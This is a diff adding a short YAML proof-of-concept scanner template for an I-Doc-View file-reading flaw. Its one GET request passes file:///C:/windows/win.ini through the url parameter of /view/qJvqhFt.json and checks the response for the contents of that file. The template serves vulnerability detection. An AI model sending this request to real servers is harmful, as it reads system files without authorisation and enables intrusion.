@@ -1,0 +1,16 @@
+name: poc-yaml-I-Doc-View-qJvqhFt-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi
+    expression: response.status == 200 && response.body.bcontains(b'for 16-bit app support')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139509499
